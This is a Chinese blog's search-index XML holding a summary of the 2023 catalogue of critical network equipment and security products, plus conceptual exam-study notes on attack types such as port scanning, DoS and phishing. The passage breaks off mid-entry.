<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2023《网络关键设备和网络安全专用产品目录》</title>
      <link href="/catalogue-of-network-equipment-and-security-products/"/>
      <url>/catalogue-of-network-equipment-and-security-products/</url>
      
        <content type="html"><![CDATA[<p>昨晚，中共中央网络安全和信息化委员会办公室 发布了 <strong>关于调整《网络关键设备和网络安全专用产品目录》的公告</strong>，距离上次发布已经过了6年多的时间，我这也跟着紧跟时事了解一下。</p><p>相关资源如下</p><ul><li><p>2023版公告原文：<a href="http://www.cac.gov.cn/2023-07/03/c_1690034742530280.htm">关于调整《网络关键设备和网络安全专用产品目录》的公告</a></p></li><li><p>2023版附件下载链接：<a href="http://www.cac.gov.cn/cms/pub/interact/downloadfile.jsp?filepath=ekdHFflbXTKqZLE43DV~bQPSxqDGVU2OsnYJ/ekB55xykeU~Hq7U5F6MkeYHikg6zJOhW2Nj6ZRZUVXUlkDEyTEjTcORl73kmCTdYOvdSjs=&fText=%E7%BD%91%E7%BB%9C%E5%85%B3%E9%94%AE%E8%AE%BE%E5%A4%87%E5%92%8C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E7%94%A8%E4%BA%A7%E5%93%81%E7%9B%AE%E5%BD%95">网络关键设备和网络安全专用产品目录</a></p></li><li><p>2017版公告原文：<a href="http://www.cac.gov.cn/2017-06/09/c_1121113591.htm">关于发布《网络关键设备和网络安全专用产品目录（第一批）》的公告</a></p></li></ul><p>在<strong>网络关键设备</strong>方面，6年过去了，<strong>没有任何变化</strong></p><p>而<strong>网络安全专用产品</strong>，从2017年的<strong>11条增加到34条，新增了23条</strong></p><p>17年只提供了传统的安全产品，23年的安全产品的范围更加广，更加细分</p><p>这也能能解释现在的网络设备厂商基本是那几家大厂，而安全厂商却百花齐放。因为安全的方向实在是太广了，新创安全厂商想要做产品，那么多的细分赛道可以选，没哪家新创公司敢去做ids，ips，waf这些传统安全设备。</p><h1 id="网络关键设备"><a href="#网络关键设备" class="headerlink" title="网络关键设备"></a>网络关键设备</h1><h2 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h2><p>整系统吞吐量(双向) ≥１２Tbps<br>整系统路由表容量 ≥５５万条</p><h2 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h2><p>整系统吞吐量(双向) ≥３０Tbps<br>整系统包转发率 ≥１０Gpps</p><h2 id="服务器-机架式"><a href="#服务器-机架式" class="headerlink" title="服务器(机架式)"></a>服务器(机架式)</h2><p>CPU 数量 ≥８个<br>单 CPU 内核数 ≥１４个<br>内存容量 ≥２５６GB</p><h2 id="可编程逻辑控制器-PLC设备"><a href="#可编程逻辑控制器-PLC设备" class="headerlink" title="可编程逻辑控制器(PLC设备)"></a>可编程逻辑控制器(PLC设备)</h2><p>控制器指令执行时间 ≤ 0.08微秒</p><h1 id="网络安全专用产品"><a href="#网络安全专用产品" class="headerlink" title="网络安全专用产品"></a>网络安全专用产品</h1><h2 id="数据备份与恢复产品"><a href="#数据备份与恢复产品" class="headerlink" title="数据备份与恢复产品"></a>数据备份与恢复产品</h2><p>能够对信息系统数据进行备份和恢复,且对备份与恢复过程进行管理的产品.</p><h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p>对经过的数据流进行解析,并实现访问控制及安全防护功能的产品.</p><h2 id="入侵检测系统-IDS"><a href="#入侵检测系统-IDS" class="headerlink" title="入侵检测系统(IDS)"></a>入侵检测系统(IDS)</h2><p>以网络上的数据包作为数据源,监听所保护网络节点的所有数据包并进行分析,从而发现异常行为的产品.</p><h2 id="入侵防御系统-IPS"><a href="#入侵防御系统-IPS" class="headerlink" title="入侵防御系统(IPS)"></a>入侵防御系统(IPS)</h2><p>以网桥或网关形式部署在网络通路上,通过分析网络流量发现具有入侵特征的网络行为,在其传入被保护网络前进行拦截的产品.</p><h2 id="网络和终端隔离产品"><a href="#网络和终端隔离产品" class="headerlink" title="网络和终端隔离产品"></a>网络和终端隔离产品</h2><p>在不同的网络终端和网络安全域之间建立安全控制点,实现在不同的网络终端和网络安全域之间提供访问可控服务的产品.</p><h2 id="反垃圾邮件产品"><a href="#反垃圾邮件产品" class="headerlink" title="反垃圾邮件产品"></a>反垃圾邮件产品</h2><p>能够对垃圾邮件进行识别和处理的软件或软硬件组合,包括但不限于反垃圾邮件网关、反垃圾邮件系统、安装于邮件服务器的反垃圾邮件软件,以及与邮件服务器集成的反垃圾邮件产品等.</p><h2 id="网络安全审计产品"><a href="#网络安全审计产品" class="headerlink" title="网络安全审计产品"></a>网络安全审计产品</h2><p>采集网络、信息系统及其组件的记录与活动数据,并对这些数据进行存储和分析,以实现事件追溯、发现安全违规或异常的产品.</p><h2 id="网络脆弱性扫描产品"><a href="#网络脆弱性扫描产品" class="headerlink" title="网络脆弱性扫描产品"></a>网络脆弱性扫描产品</h2><p>利用扫描手段检测目标网络系统中可能存在的安全弱点的软件或软硬件组合的产品.</p><h2 id="安全数据库系统"><a href="#安全数据库系统" class="headerlink" title="安全数据库系统"></a>安全数据库系统</h2><p>从系统设计、实现、使用和管理等各个阶段都遵循一套完整的系统安全策略的数据库系统,目的是在数据库层面保障数据安全.</p><h2 id="网站数据恢复产品"><a href="#网站数据恢复产品" class="headerlink" title="网站数据恢复产品"></a>网站数据恢复产品</h2><p>提供对网站数据的监测、防篡改,并实现数据备份和恢复等安全功能的产品.</p><h2 id="虚拟专用网产品"><a href="#虚拟专用网产品" class="headerlink" title="虚拟专用网产品"></a>虚拟专用网产品</h2><p>在互联网链路等公共通信基础网络上建立专用安全传输通道的产品.</p><h2 id="防病毒网关"><a href="#防病毒网关" class="headerlink" title="防病毒网关"></a>防病毒网关</h2><p>部署于网络和网络之间,通过分析网络层和应用层的通信,根据预先定义的过滤规则和防护策略实现对网络内病毒防护的产品.</p><h2 id="统一威胁管理产品-UTM"><a href="#统一威胁管理产品-UTM" class="headerlink" title="统一威胁管理产品(UTM)"></a>统一威胁管理产品(UTM)</h2><p>通过统一部署的安全策略,融合多种安全功能,针对面向网络及应用系统的安全威胁进行综合防御的网关型设备或系统.</p><h2 id="病毒防治产品"><a href="#病毒防治产品" class="headerlink" title="病毒防治产品"></a>病毒防治产品</h2><p>用于检测发现或阻止恶意代码的传播以及对主机操作系统应用软件和用户文件的篡改、窃取和破坏等的产品.</p><h2 id="安全操作系统"><a href="#安全操作系统" class="headerlink" title="安全操作系统"></a>安全操作系统</h2><p>从系统设计、实现到使用等各个阶段都遵循了一套完整的安全策略的操作系统,目的是在操作系统层面保障系统安全.</p><h2 id="安全网络存储"><a href="#安全网络存储" class="headerlink" title="安全网络存储"></a>安全网络存储</h2><p>通过网络基于不同协议连接到服务器的专用存储设备.</p><h2 id="公钥基础设施"><a href="#公钥基础设施" class="headerlink" title="公钥基础设施"></a>公钥基础设施</h2><p>支持公钥管理体制,提供鉴别、加密、完整性和不可否认服务的基础设施.</p><h2 id="网络安全态势感知产品"><a href="#网络安全态势感知产品" class="headerlink" title="网络安全态势感知产品"></a>网络安全态势感知产品</h2><p>通过采集网络流量、资产信息、日志、漏洞信息、告警信息、威胁信息等数据,分析和处理网络行为及用户行为等因素,掌握网络安全状态,预测网络安全趋势,并进行展示和监测预警的产品.</p><h2 id="信息系统安全管理平台"><a href="#信息系统安全管理平台" class="headerlink" title="信息系统安全管理平台"></a>信息系统安全管理平台</h2><p>对信息系统的安全策略以及执行该策略的安全计算环境、安全区域边界和安全通信网络等方面的安全机制实施统一管理的平台.</p><h2 id="网络型流量控制产品"><a href="#网络型流量控制产品" class="headerlink" title="网络型流量控制产品"></a>网络型流量控制产品</h2><p>对安全域的网络进行流量监测和带宽控制的流量管理系统.</p><h2 id="负载均衡产品"><a href="#负载均衡产品" class="headerlink" title="负载均衡产品"></a>负载均衡产品</h2><p>提供链路负载均衡、服务器负载均衡、网络流量优化和智能处理等功能的产品.</p><h2 id="信息过滤产品"><a href="#信息过滤产品" class="headerlink" title="信息过滤产品"></a>信息过滤产品</h2><p>对文本、图片等网络信息进行筛选控制的产品.</p><h2 id="抗拒绝服务攻击产品"><a href="#抗拒绝服务攻击产品" class="headerlink" title="抗拒绝服务攻击产品"></a>抗拒绝服务攻击产品</h2><p>用于识别和拦截拒绝服务攻击、保障系统可用性的产品.</p><h2 id="终端接入控制产品"><a href="#终端接入控制产品" class="headerlink" title="终端接入控制产品"></a>终端接入控制产品</h2><p>提供对接入网络的终端进行访问控制功能的产品.</p><h2 id="USB移动存储介质管理系统"><a href="#USB移动存储介质管理系统" class="headerlink" title="USB移动存储介质管理系统"></a>USB移动存储介质管理系统</h2><p>对移动存储设备采取身份认证、访问控制、审计机制等管理手段,实现移动存储设备与主机设备之间可信访问的产品.</p><h2 id="文件加密产品"><a href="#文件加密产品" class="headerlink" title="文件加密产品"></a>文件加密产品</h2><p>用于防御攻击者窃取以文件等形式存储的数据、保障存储数据安全的产品.</p><h2 id="数据泄露防护产品"><a href="#数据泄露防护产品" class="headerlink" title="数据泄露防护产品"></a>数据泄露防护产品</h2><p>通过对安全域内部敏感信息输出的主要途径进行控制和审计,防止安全域内部敏感信息被非授权泄露的产品.</p><h2 id="数据销毁软件产品"><a href="#数据销毁软件产品" class="headerlink" title="数据销毁软件产品"></a>数据销毁软件产品</h2><p>采用信息技术进行逻辑级底层数据清除,彻底销毁存储介质所承载数据的产品.</p><h2 id="安全配置检查产品"><a href="#安全配置检查产品" class="headerlink" title="安全配置检查产品"></a>安全配置检查产品</h2><p>基于安全配置要求实现对资产的安全配置检测和合规性分析,生成安全配置建议和合规性报告的产品.</p><h2 id="运维安全管理产品"><a href="#运维安全管理产品" class="headerlink" title="运维安全管理产品"></a>运维安全管理产品</h2><p>对信息系统重要资产维护过程实现单点登录、集中授权、集中管理和审计的产品.</p><h2 id="日志分析产品"><a href="#日志分析产品" class="headerlink" title="日志分析产品"></a>日志分析产品</h2><p>采集信息系统中的日志数据,并进行集中存储和分析的安全产品.</p><h2 id="身份鉴别产品"><a href="#身份鉴别产品" class="headerlink" title="身份鉴别产品"></a>身份鉴别产品</h2><p>要求用户提供以电子信息或生物信息为载体的身份鉴别信息,确认应用系统使用者身份的产品.</p><h2 id="终端安全监测产品"><a href="#终端安全监测产品" class="headerlink" title="终端安全监测产品"></a>终端安全监测产品</h2><p>对终端进行安全性监测和控制,发现和阻止系统和网络资源非授权使用的产品.</p><h2 id="电子文档安全管理产品"><a href="#电子文档安全管理产品" class="headerlink" title="电子文档安全管理产品"></a>电子文档安全管理产品</h2><p>通过制作安全电子文档或将电子文档转换为安全电子文档,对安全电子文档进行统一管理、监控和审计的产品.</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 安全合规 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全合规 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实习总结-半路出家网安人的记录与思考</title>
      <link href="/internship-summary/"/>
      <url>/internship-summary/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="314f5a5179fe477e568a30c09f3e813e23ecae18d3fe92175a23f83c58f7bcdd"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 总结思考 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结思考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第2章：网络攻击原理与常用方法</title>
      <link href="/chapter2-attack-priciples-and-methods/"/>
      <url>/chapter2-attack-priciples-and-methods/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>备考合集：<a href="https://jenchoi.tk/information-security-engineer">2023软考-信息安全工程师</a></strong></p></blockquote><h1 id="本章分析"><a href="#本章分析" class="headerlink" title="本章分析"></a>本章分析</h1><ul><li>分值：3-4分</li><li>重点：端口扫描、恶意代码、拒绝服务攻击、DDOS 攻击</li></ul><h1 id="网络攻击"><a href="#网络攻击" class="headerlink" title="网络攻击"></a>网络攻击</h1><p><strong>网络攻击是指损害网络系统安全属性的危害行为</strong>。危害行为导致网络系统的机密性、完整性、可用性、可控性、真实性、抗抵赖性等受到不同程度的破坏。</p><p>常见的危害行为有四个<strong>基本类型</strong>：<br>(1) 信息泄露攻击（机密性）<br>(2) 完整性破坏攻击（完整性）<br>(3) 拒绝服务攻击（可用性）<br>(4) 非法使用攻击。</p><h1 id="网络攻击模型"><a href="#网络攻击模型" class="headerlink" title="网络攻击模型"></a>网络攻击模型</h1><p>（1）攻击树模型（故障树）<br>（2）MITRE ATT &amp; CK 模型（攻击矩阵）<br>（3）网络杀伤链 (Kill Chain) 模型</p><h1 id="网络攻击一般流程"><a href="#网络攻击一般流程" class="headerlink" title="网络攻击一般流程"></a>网络攻击一般流程</h1><ul><li>(1) 隐藏攻击源。隐藏黑客主机位置使得系统管理无法追踪。<ul><li>利用被侵入的主机作为跳板；</li><li>免费代理网关；</li><li>伪造 IP 地址；</li><li>冒用户账号。</li></ul></li><li>(2) 收集攻击目标信息。确定攻击目标并收集目标系统的有关信息。</li><li>(3) 挖掘漏洞信息。从收集到的目标信息中提取可使用的漏洞信息。</li><li>(4) 获取目标访问权限。获取目标系统的普通或特权账户的权限。</li><li>(5) 隐蔽攻击行为。隐蔽在目标系统中的操作，防止入侵行为被发现。<ul><li>连接隐藏、进程隐藏、文件隐藏</li></ul></li><li>(6) 实施攻击。进行破坏活动或者以目标系统为跳板向其他系统发起新的攻击。</li><li>(7) 开辟后门。在目标系统中开辟后门，方便以后入侵。</li><li>(8) 清除攻击痕迹。避免安全管理员的发现、追踪以及法律部门取证。<ul><li>篡改曰志文件中的审计信息；</li><li>改变系统时间造成日志文件数据紊乱以迷惑系统管理员；</li><li>删除或停止审计服务进程；</li><li>干扰入侵检测系统的正常运行；</li><li>修改完整性检测标签。</li></ul></li></ul><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>目的：找出目标系统上提供的服务列表</p><p>扫描类型</p><ol><li>完全连接扫描。三次握手，建立连接</li><li>半连接扫描。只完成前两次握手，不建立一次完整的连接</li><li>SYN 扫描。发送连接请求，根据响应状况判断（ACK-开放，RESET-未开放）</li><li>ID 头信息扫描<br> 需要用一台第三方机器配合扫描，并且这台机器的网络通信量要非常少，即dumb 主机。<br> 首先由源主机A向 dumb 主机B发出连续的 PING 数据包，并且查看主机B返回的数据包ID 头信息。一般而言，每个顺序数据包的 ID 头的值会增加 。然后由源主机A假冒主机B的地址向目的主机C的任意端口 (1 ~65535) 发送 SYN 数据包。这时，主机C向主机B发送的数据包有两种可能的结果：<br> • SYNIACK 表示该端口处千监听状态。<br> • RSTIACK 表示该端口处千非监听状态。<br> 那么，由后续 PING 数据包的响应信息的 ID 头信息可以看出，如果主机C的某个端口是开放的，则主机B返回A的数据包中， ID 头的值不是递增 1，而是大于1。如果主机C的某个端口是非开放的，则主机B返回A的数据包中，ID 头的值递增 1，非常规律。</li><li>隐蔽扫描。绕过 IDS 、防火墙和监视系统等安全机制，取得目标主机端口信息的一种扫描方式。</li><li>SYNIACK 扫描<br> 直接发送 SYN|ACK 数据包，而不是先发送SYN数据包。由于这种方法不发送 SYN 数据包，目标主机会认为这是一次错误的连接，从而会报错。<ul><li>关闭：返回 RST 信息</li><li>开放：不返回任何信息，直接数据包抛弃</li></ul></li><li>FIN 扫描<br> 发送 FIN 数据包，然后查看反馈信息。<ul><li>关闭：返回 RESET 信息</li><li>开放：不返回任何信息</li></ul></li><li>ACK 扫描<br> 发送 FIN 数据包，然后查看反馈数据包的 TTL 值和 WIN 值<ul><li>关闭：TTL &gt; 64，WIN &#x3D; 0</li><li>开放：TTL &lt; 64，WIN &gt; 0</li></ul></li><li>NULL 扫描<br> 将源主机发送的数据包中的 ACK FIN RST SYN URG PSH 等标志位全部置空<ul><li>关闭：RST信息</li><li>开放：无返回</li></ul></li><li>XMAS 扫描<br>与 NULL 扫描原理相同，将要发送的数据包中的 ACK FIN RST SYN URG PSH 等头标志位全部置成 1 。<ul><li>关闭：RST信息</li><li>开放：无返回</li></ul></li></ol><h1 id="口令破解"><a href="#口令破解" class="headerlink" title="口令破解"></a>口令破解</h1><p>主要工作流程</p><ol><li>建立与目标网络服务的网络连接；</li><li>选取1个用户列表文件及字典文件；</li><li>在用户列表文件及字典文件中，选取1组用户和口令，按网络服务协议规定，将用户名及口令发送给目标网络服务端口；</li><li>检测远程服务返回信息，确定口令尝试是否成功；</li><li>再取另1组用户和口令，重复循环试验，直至口令用户列表文件及字典文件选取完毕</li></ol><h1 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h1><p>缓冲区溢出攻击可以使攻击者有机会获得1台主机的<strong>部分或全部的控制权</strong>。</p><p>据统计，缓冲区溢出攻击占远程网络攻击的绝大多数。<br>缓冲区溢出成为远程攻击主要方式的原因是，<strong>缓冲区溢出漏洞会给予攻击者控制程序执行流程的机会</strong>。攻击者将特意构造的攻击代码植入有缓冲区溢出漏洞的程序之中，改变漏洞程序的执行过程，就可以得到被攻击主机的控制权。</p><h1 id="⭐恶意代码"><a href="#⭐恶意代码" class="headerlink" title="⭐恶意代码"></a>⭐恶意代码</h1><p>恶意代码是网络攻击常见的攻击手段。</p><p>常见的恶意代码类型</p><ul><li><p>计算机病毒</p></li><li><p>网络蠕虫</p></li><li><p>特洛伊木马</p></li><li><p>后门</p></li><li><p>逻辑炸弹</p></li><li><p>僵尸网络</p></li><li><p>网络蠕虫程序是 1988 年由小莫里斯编制的，该程序具有复制传播功能，可以感染 UNIX 系统主机，使网上 6000 多台主机无法运行；</p></li><li><p>2001年8月，红色代码蠕虫病毒利用微软 Web 服务器 IIS4.0 或 5.0 中 index 服务的安全缺陷，通过自动扫描感染方式传播蠕虫；</p></li><li><p>2010 年“震网“网络蠕虫是首个专门用于定向攻击真实世界中基础（能源）设施的恶意代码。</p></li></ul><p>恶意代码的一般命名格式：&lt;恶意代码前缀&gt;.&lt;恶意代码名称&gt;.&lt;恶意代码后缀&gt;<br>常用恶意代码前缀</p><ul><li>系统病毒：Win32、PE、Win95、W32、W95等</li><li>网络蠕虫：Worm (勒索软件 WanaCra</li><li>木马病毒：Trojan</li><li>脚本病毒：Script</li><li>宏病毒的：Macro，其可能还有第二前缀是 Word、Word97、Excel、Exce197</li><li>后门程序： Backdoor</li><li>破坏性程序：Harm</li><li>玩笑病毒：Joke</li><li>捆绑机病毒：Binder</li></ul><h1 id="⭐拒绝服务"><a href="#⭐拒绝服务" class="headerlink" title="⭐拒绝服务"></a>⭐拒绝服务</h1><p>拒绝服务攻击是指攻击者利用系统的缺陷，执行一些恶意的操作，使得合法的系统用户不能及时得到应得的服务或系统资源，如 CPU 处理时间、存储器、网络带宽等。</p><p>拒绝服务攻击往往造成计算机或网络无法正常工作，进而会使一个依赖于计算机或网络服务的企业不能正常运转。</p><p>最本质的特征：<strong>延长服务等待时间</strong><br>当服务等待时间超过某个阈值时，用户因无法忍耐而放弃服务。拒绝服务攻击延迟或者阻碍合法的用户使用系统提供的服务，对关键性和实时性服务造成的影响最大。</p><p>特点：</p><ol><li>难确认性。拒绝服务攻击很难判断，用户在自己的服务得不到及时响应时，并不认为自己（或系统）受到攻击，反而可能认为是系统故障造成 时的服务失效。</li><li>隐蔽性。正常请求服务隐藏拒绝服务攻击的过程。</li><li>资源有限性。由于计算机资源有限，容易实现拒绝服务攻击。</li><li>软件复杂性。由于软件所固有的复杂性，设计实现难以确保软件没有缺陷。因而攻击者有机可乘，可以直接利用软件缺陷进行拒绝服务攻击，例如泪滴攻击。</li></ol><p>类型</p><ol><li>同步包风暴 (SYN Flood)<br> 发送多个同步数据包 (SYN Packet) 给服务器，服务器因无法收到确认数据包 (ACK Packet) ，使 TCP&#x2F;IP 协议的三次握手无法顺利完成，因而无法建立连接。其原理是发送大量半连接状态的服务请求，Unix 等服务主机无法处理正常的连接请求，因而影响正常运作。</li><li>UDP 洪水 (UDP Flood)<br> 利用简单的 TCP&#x2F;IP 服务，如用 Chargen 和 Echo 传送毫无用处的占满带宽的数据。通过伪造与某一主机的 Chargen 服务之间的一次 UDP 连接，回复地址指向开放 Echo 服务的一台主机，生成在两台主机之间的足够多的无用数据流。</li><li>Smurf 攻击<br> 一种简单的 Smurf 攻击是将回复地址设置成目标网络广播地址的 ICMP 应答请求数据包，使该网络的所有主机都对此 ICMP 应答请求作出应答，导致网络阻塞，比 ping of death 洪水的流量高出一或两个数量级。<br> 更加复杂的 Smurf 攻击是将源地址改为第三方的目标网络，最终导致第三方网络阻塞。</li><li>垃圾邮件<br> 攻击者利用邮件系统制造垃圾信息，甚至通过专门的邮件炸弹 (mail bomb) 程序给受害用户的信箱发送垃圾信息，耗尽用户信箱的磁盘空间，使用户无法应用这个信箱。</li><li>消耗 CPU 和内存资源<br> 利用目标系统的计算算法漏洞，构造恶意输入数据集，导致目标系统的 CPU 或内存资源耗尽，从而使目标系统瘫痪，如 Hash DoS</li><li>死亡之 ping (ping of death)<br> 早期，路由器对包的最大尺寸都有限制，许多操作系统在实现 TCP&#x2F;IP 堆栈时，规定 ICMP包小千等千 64KB，并且在对包的标题头进行读取之后，要根据该标题头中包含的信息为有效载荷生成缓冲区。当产生畸形的、尺寸超过 ICMP 上限的包，即加载的尺寸超过 64KB 上限时，就会出现内存分配错误，导致 TCP&#x2F;IP 堆栈崩溃，使接收方停机。</li><li>泪滴攻击 (Teardrop Attack)<br> 泪滴攻击暴露出 IP 数据包分解与重组的弱点 IP 数据包在网络中传输时，会被分解成许多不同的片传送，并借由偏移量字段 (Offset Field) 作为重组的依据。泪滴攻击通过加入过多或不必要的偏移量字段，使计算机系统重组错乱，产生不可预期的后果。</li><li>分布式拒绝服务攻击 (Distributed Denial of Service Attack)<br> 分布式拒绝服务攻击是指植入后门程序从远程遥控攻击，攻击者从多个已入侵的跳板主机控制数个代理攻击主机，所以攻击者可同时对已控制的代理攻击主机激活干扰命令，对受害主机大量攻击。<br> 分布式拒绝服务攻击程序，最著名的有 Trinoo、TFN、TFN2K、Stacheldraht四种</li></ol><h1 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h1><p>网络钓鱼 (Phishing) 是一种通过假冒可信方（知名银行、在线零售商和信用卡公司等可信的品牌）提供网上服务，以欺骗手段获取敏感个人信息（如口令、信用卡详细信息等）的攻击方式。</p><p>目前，网络钓鱼综合利用社会工程攻击技巧和现代多种网络攻击手段，以达到欺骗意图。<br>最典型的网络钓鱼方法是，网络钓鱼者利用欺骗性的电子邮件和伪造的网站来进行诈骗活动，诱骗访问者提供一些个人信息，如信用卡号、账户和口令、社保编号等内容，以谋求不正当利益。<br>例如，网络钓鱼攻击者构造 封所谓“安全提醒＂邮件发给客户，然后让客户点击虚假网站 填写敏感的个人信息 这样网络钓鱼攻击者就能获取受害者的个人信息，并非法利用</p><h1 id="网络窃听"><a href="#网络窃听" class="headerlink" title="网络窃听"></a>网络窃听</h1><p>网络窃听是指利用网络通信技术缺陷，使得攻击者能够获取到其他人的网络通信信息。</p><p>常见的网络窃听技术手段</p><ul><li>网络嗅探</li><li>中间人攻击</li></ul><p>一般的计算机系统通常只接收目的地址指向自己的网络包，而忽略其他的包。但在很多情况下，一台计算机的网络接口可能收到目的地址并非指向自身的网络包，在完全的广播子网中，所有涉及局域网中任何一台主机的网络通信内容均可被局域网中所有的主机接收到，这就使得网络窃听变得十分容易。网络攻击者将主机网络接口的方式设成“杂乱”模式，就可以接收整个网络上的信息包，从而可以获取敏感的口令，甚至将其重组，还原为用户传递的文件。</p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>在Web 服务中，一般采用三层架构模式：<strong>浏览器＋Web 服务器＋数据库</strong><br>其中， Web 脚本程序负责处理来自浏览器端提交的信息，如用户登录名和密码、查询请求等。但是，由于 Web脚本程序的编程漏洞，对来自浏览器端的信息缺少输入安全合法性检查，网络攻击者利用这种类型的漏洞 SQL 命令插入 Web 表单的输入域或页面的请求查找字符串，欺骗服务器执行恶意的 SQL 命令。</p><h1 id="社交工程"><a href="#社交工程" class="headerlink" title="社交工程"></a>社交工程</h1><p>网络攻击者通过一系列的社交活动，获取需要的信息。例如伪造系统管理员的身份，给特定的用户发电子邮件骗取他的密码口令。有的攻击者会给用户送免费实用程序，不过该程序除了完成用户所需的功能外，还隐藏了 个将用户的计算机信息发送给攻击者的功能。很多时候，没有经验的网络用户容易被攻击者欺骗，泄露相关信息。例如，攻击者打电话给公司职员，自称是网络安全管理成员，并且要求获得用户口令。攻击者得到用户口令后，就能够滥用合法用户的权利。</p><h1 id="电子监听"><a href="#电子监听" class="headerlink" title="电子监听"></a>电子监听</h1><p>网络攻击者采用电子设备远距离地监视电磁波的传送过程。灵敏的无线电接收装置能够在远处看到计算机操作者输入的字符或屏幕显示的内容。</p><h1 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h1><p>会话劫持是指攻击者在初始授权之后建立一个连接，在会话劫持以后，攻击者具有合法用户的特权权限。<br>例如，一个合法用户登录一台主机，当工作完成后，没有切断主机。然后，攻击者乘机接管，因为主机并不知道合法用户的连接已经断开。于是攻击者能够使用合法用户的所有权限。典型的实例是 “TCP 会话劫持“。</p><h1 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h1><p>漏洞扫描是一种自动检测远程或本地主机安全漏洞的软件，通过漏洞扫描器可以自动发现系统的安全漏洞。<br>网络攻击者利用漏洞扫描来搜集目标系统的漏洞信息，为下一步的攻击做准备。</p><p>常见的漏洞扫描技术</p><ul><li>CGI 漏洞扫描</li><li>弱口令扫描</li><li>操作系统漏洞扫描</li><li>数据库漏洞扫描</li></ul><p>一些黑客或安全入员为了更快速地查找网络系统中的漏洞，会针对某个漏洞开发专用的漏<br>洞扫描工具，例如 RPC 漏洞扫描器。</p><h1 id="代理技术"><a href="#代理技术" class="headerlink" title="代理技术"></a>代理技术</h1><p>网络攻击者通过免费代理服务器进行攻击，其目的是以代理服务器为“攻击跳板”，即使攻击目标的网络管理员发现了，也难以追踪到网络攻击者的真实身份或 IP 地址。<br>为了增加追踪的难度，网络攻击者还会用多级代理服务器或者“跳板主机”来攻击目标。</p><p>在黑客中，代理服务器被叫作“肉鸡”，黑客常利用所控制的机器进行攻击活动，例如 DDoS 攻击。</p><h1 id="数据加密"><a href="#数据加密" class="headerlink" title="数据加密"></a>数据加密</h1><p>网络攻击者常常采用数据加密技术来逃避网络安全管理人员的追踪。<br>加密使网络攻击者的数据得到有效保护，即使网络安全管理人员得到这些加密的数据，没有密钥也无法读懂，这样就实现了攻击者的自身保护。<br>攻击者的安全原则是，任何与攻击有关的内容都必须加密或者立刻销毁。</p><h1 id="黑客常用工具"><a href="#黑客常用工具" class="headerlink" title="黑客常用工具"></a>黑客常用工具</h1><ol><li>扫描器<ul><li>分类<ul><li>地址扫描器</li><li>端口扫描器</li><li>漏洞扫描器</li></ul></li><li>常用软件：nmap、Nessus、Super Scan</li></ul></li><li>远程监控<br> 冰河、网络精灵、 Netcat</li><li>密码破解<ul><li>破解方式：口令猜测、穷举搜索、撞库等</li><li>常见工具<ul><li>John the Ripper用于检查 Unix&#x2F;Linux 系统的弱口令</li><li>LOphtCrack：用于破解 Windows 系统口令</li></ul></li></ul></li><li>网络嗅探器<br> 网络嗅探器 (Network Sniffer) 是一种黑客攻击工具，通过网络嗅探，黑客可以截获网络的信息包，之后对加密的信息包进行破解，进而分析包内的数据，获得有关系统的信息。如可以截获个人上网的信息包分析上网账号、系统账号、电子邮件账号等个人隐私资料。网络嗅探类软件已经成为黑客获取秘密信息的重要手段.<ul><li>常见的网络嗅探器工具<ul><li>Tcpdump&#x2F;WireShark Tcpdump 是基于命令行的网络数据包分析软件，可以作为网络嗅探工具，能把匹配规则的数据包内容显示出来。而 WireShark 则提供图形化的网络数据包分析功能，可视化地展示网络数据包的内容。</li><li>DSniff DSniff 是由 Dug Song 开发的一套包含多个工具的软件套件，包括 dsniff、filesnarf、mailsnarf、msgsnarf、rlsnarf、webspy 。使用 DSniff 可以获取口令、邮件、文件等信息。</li></ul></li></ul></li><li>安全渗透工具箱<br> MSF、BackTrack5</li></ol><h1 id="网络攻击案例"><a href="#网络攻击案例" class="headerlink" title="网络攻击案例"></a>网络攻击案例</h1><h2 id="DDoS"><a href="#DDoS" class="headerlink" title="DDoS"></a>DDoS</h2><p>DDoS 攻击步骤</p><ol><li>通过探测扫描大量主机，寻找可以进行攻击的目标</li><li>攻击有安全漏洞的主机，并设法获取控制权</li><li>在已攻击成功的主机中安装客户端攻击程序</li><li>利用已攻击成功的主机继续进行扫描和攻击</li><li>当攻击客户端达到一定的数目后，攻击者在主控端给客户端攻击程序发布向特定目标进行攻击的命令。</li></ol><p>从分布式拒绝服务攻击的案例来看，攻击者进行大型或复杂的攻击之前，需要利用已攻击成功的主机，时机成熟后再向最终的目标发起攻击。从这一点上来说，大型或复杂的攻击并不能一步到位，而是经过若干个攻击操作步骤后才能实现最终的攻击意图。</p><p>DDoS 常用的攻击技术手段</p><ul><li>HTTP 